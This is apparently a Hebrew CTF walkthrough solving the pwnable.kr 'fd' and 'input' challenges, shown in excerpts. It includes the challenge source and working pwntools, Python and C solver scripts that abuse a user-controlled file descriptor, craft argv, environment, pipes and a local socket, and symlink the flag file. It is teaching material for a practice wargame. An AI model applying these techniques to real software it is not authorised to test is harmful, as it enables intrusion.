...
```bash
ssh fd@pwnable.kr -p2222        # סיסמה: guest
cat fd.c
```
...
p = s.process(['./fd', '4660'])    # רץ בתיקיית הבית, שם נמצא flag
p.sendline(b'LETMEWIN')            # sendline מוסיף \n בעצמו
p.recvuntil(b'good job')
print(p.recvall().decode())
```

למה זה עבד: כל הרעיון הוא שערך שנשלט על ידינו (`argv[1]`) הפך לתיאור קובץ. ברגע שגרמנו ל-fd להיות 0, ה-`read` קרא מ-stdin ואנחנו סיפקנו את המחרוזת המבוקשת. איך להכליל: בכל פעם שערך שנשלט על ידי המשתמש הופך ל-fd, אינדקס, גודל או אופסט - בדקו את ערכי הקצה. כאן `0` היה ערך הקצה שנתן לנו שליטה. במקרים אחרים זה יכול להיות ערך שלילי, אפס, או ערך גדול שגורם לגלישה.
...
if(strcmp(argv['A'],"\x00")) return 0;              // argv[65] מחרוזת ריקה
if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;      // argv[66] = רווח, \n, \r
...
// Stage 4 - file
FILE* fp = fopen("\x0a", "r");                       // קובץ בשם ירידת-שורה
if(!fp) return 0;
...
// Stage 5 - network
// ... socket/bind/listen/accept על הפורט atoi(argv['C']) ...
...
```text
שלב 1  argv    argc==100 ; argv[65]="" ; argv[66]=" \n\r" ; argv[67]=מחרוזת הפורט
שלב 2  stdin   fd0 = 00 0a 00 ff        ; fd2 = 00 0a 02 ff
שלב 3  env     getenv("\xde\xad\xbe\xef") == "\xca\xfe\xba\xbe"
שלב 4  file    קובץ בשם "\x0a" מכיל 00 00 00 00
שלב 5  net     מתחברים לפורט argv[67] ושולחים de ad be ef
```
...
chmod 777 .
ln -sf /home/input2/flag flag       # cat flag בתיקיית העבודה יקרא את הדגל האמיתי
```
...
# שלב 4: יוצרים קובץ ששמו ירידת-שורה, עם ארבעה אפסים
with open('\x0a', 'wb') as f:
    f.write(b'\x00\x00\x00\x00')

# שלב 1: argv באורך 100 בדיוק
argv = [b'input'] * 100
argv[ord('A')] = b''                 # argv[65] = מחרוזת ריקה
argv[ord('B')] = b'\x20\x0a\x0d'     # argv[66] = רווח, \n, \r
argv[ord('C')] = str(PORT).encode()  # argv[67] = הפורט להאזנה

# שלב 3: משתנה סביבה עם בתים גבוהים
env = {b'\xde\xad\xbe\xef': b'\xca\xfe\xba\xbe'}

# צינורות: אנחנו נכתוב, והבן יקרא מ-fd0 ומ-fd2
in_r,  in_w  = os.pipe()
err_r, err_w = os.pipe()

pid = os.fork()
if pid == 0:
    # תהליך-בן: מסדרים את טבלת ה-fd ואז exec
    os.dup2(in_r, 0)                 # fd0 של הבן = קצה קריאה של צינור הקלט
    os.dup2(err_r, 2)                # fd2 של הבן = קצה קריאה של צינור השגיאות
    os.execve(BIN, argv, env)
    os._exit(1)

# תהליך-הורה
os.write(in_w,  b'\x00\x0a\x00\xff') # שלב 2 - fd0
os.write(err_w, b'\x00\x0a\x02\xff') # שלב 2 - fd2

time.sleep(1)                        # נחכה שהתוכנית תבצע bind/listen
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', PORT))       # שלב 5 - מתחברים לפורט שהתוכנית מאזינה עליו
...
err_r, err_w = os.pipe()                 # התוכנית קוראת מ-fd2 -> ניתן לה את קצה הקריאה
p = process(executable='/home/input2/input', argv=argv, env=env, stderr=err_r)

p.send(b'\x00\x0a\x00\xff')              # שלב 2 - fd0
os.write(err_w, b'\x00\x0a\x02\xff')     # שלב 2 - fd2

time.sleep(1)
c = remote('127.0.0.1', PORT)            # שלב 5
...
int main() {
    ...
    write(in[1], "\x00\x0a\x00\xff", 4);   // שלב 2 - fd0
    write(er[1], "\x00\x0a\x02\xff", 4);   // שלב 2 - fd2
    ...
    connect(s, (struct sockaddr*)&a, sizeof(a));   // שלב 5
